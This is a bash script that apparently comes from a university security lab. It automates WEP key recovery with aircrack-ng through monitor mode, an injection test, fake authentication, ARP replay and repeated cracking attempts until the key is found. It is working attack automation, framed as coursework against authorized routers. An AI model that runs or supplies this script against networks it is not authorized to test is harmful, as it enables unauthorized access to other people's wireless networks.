#!/usr/bin/env bash
#
# wep-crack.sh — authorized WEP key-recovery automation (Lab #10, CS VIII)
#
# Drives the standard aircrack-ng flow against a WEP access point you are
# authorized to test (your own GL-AR300M16, or the class router during the
# evaluation window). WEP falls to a statistical/PTW attack on captured IVs —
# NO dictionary is used, which is the whole point of the lab.
#
#   active  mode: monitor -> injection test against the target -> fake-auth -> ARP
#                 replay. Needs a card that injects reliably against the target
#                 (e.g. Atheros AR9271). This is what recovers the key fast.
#   passive mode: monitor + capture only. Works on any card that can monitor
#                 (e.g. the Intel AC8260). Good for practice and for the analysis
#                 half of the writeup.
#
# Usage:
#   sudo ./wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
#
# Example:
#   sudo ./wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
#
# Monitor mode, the capture and the WiFi recovery come from wifi-lib.sh, the same
# code that airodump.sh and injection-test.sh use. Cleanup runs on exit, including
# Ctrl-C. If WiFi still stays dark, run ./wifi-recover.sh -i <iface>.
#
set -u

LAB_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LOGDIR="$LAB_DIR/logs"
AIRMON_LOG="$LOGDIR/airmon.log"
# shellcheck source=wifi-lib.sh
source "$LAB_DIR/wifi-lib.sh"

# ---- defaults -------------------------------------------------------------
IFACE=""
BSSID=""
CHANNEL=""
ESSID=""
MODE="active"
PREFIX="wepcap"
IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
RETRY_SECS=15            # how often to re-check the capture / re-run aircrack

while getopts ":i:b:c:e:m:o:t:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    b) BSSID="$OPTARG" ;;
    c) CHANNEL="$OPTARG" ;;
    e) ESSID="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    o) PREFIX="$OPTARG" ;;
    t) IV_TARGET="$OPTARG" ;;
    h) usage 0 ;;
    *) usage ;;
  esac
done

# ---- preflight ------------------------------------------------------------
wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemctl
[[ -n "$IFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
[[ "$MODE" == "active" || "$MODE" == "passive" ]] || die "-m must be active|passive"
[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
wifi_require_iface "$IFACE"

# ---- output location ------------------------------------------------------
# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
mkdir -p "$LOGDIR"
: > "$AIRMON_LOG"
OUT="${LOGDIR}/${PREFIX}"
KEYFILE="${OUT}.key"
rm -f "${OUT}"-*.cap "${OUT}"-*.csv 2>/dev/null

# ---- start capture --------------------------------------------------------
wifi_guard "$IFACE"
wifi_monitor_start "$IFACE"
wifi_set_channel "$CHANNEL"

echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
airodump_start "$OUT" "$CHANNEL" "$BSSID" bg
sleep 4

# ---- active injection -----------------------------------------------------
if [[ "$MODE" == "active" ]]; then
  MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
  echo "[*] Verifying injection against the target $BSSID..."
  if inject_test "$MON" "${OUT}-injection.txt" "$BSSID" >/dev/null; then
    echo "[*] Target answered $(ap_ratio "${OUT}-injection.txt" "$BSSID") probes."
  else
    echo "[!] Injection test did NOT pass: $BSSID did not answer on $IFACE."
    echo "    Replies per AP are in ${OUT}-injection.txt. Falling back to PASSIVE capture."
    echo "    An AR9271 USB adapter is the reliable injector for the active attack."
    MODE="passive"
  fi
fi

if [[ "$MODE" == "active" ]]; then
  echo "[*] Associating with AP (fake auth)..."
  # keep re-authenticating every 10s so we stay associated
  aireplay-ng --fakeauth 10 -o 1 -q 10 -a "$BSSID" -h "$MYMAC" \
    ${ESSID:+-e "$ESSID"} "$MON" >/dev/null 2>&1 &
  track_pid $!

  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
  aireplay-ng --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" >/dev/null 2>&1 &
  track_pid $!
else
  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
fi

# ---- crack loop -----------------------------------------------------------
echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
while true; do
  sleep "$RETRY_SECS"
  CSV="${OUT}-01.csv"
  ivs=0
  if [[ -f "$CSV" ]]; then
    # column 11 ("# IV") on the AP row matching our BSSID
    ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
    ivs=${ivs:-0}
  fi
  echo "    [#Data ~ ${ivs} IVs]"
  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
    last_iv=$ivs
    if aircrack-ng -q -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
      echo
      echo "============================================================"
      echo " KEY RECOVERED: $(cat "$KEYFILE")"
      echo " Saved to: $KEYFILE   Capture: ${OUT}-01.cap"
      echo "============================================================"
      exit 0
    fi
  fi
done
